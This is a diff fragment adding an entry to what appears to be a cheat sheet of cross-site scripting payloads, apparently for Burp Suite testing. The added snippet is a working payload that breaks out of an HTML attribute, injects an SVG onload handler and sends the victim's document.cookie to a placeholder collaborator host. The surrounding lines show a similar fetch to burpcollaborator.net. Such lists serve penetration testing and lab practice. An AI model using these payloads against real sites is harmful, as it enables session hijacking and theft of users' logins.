@@ -8,6 +8,12 @@ fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,bo
 </script>
 ```  
 
+>Steal Cookies with collaborator:
+
+```html
+'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
+```
+
 >Steal Cookies Exploit Server:  
 
 ```html
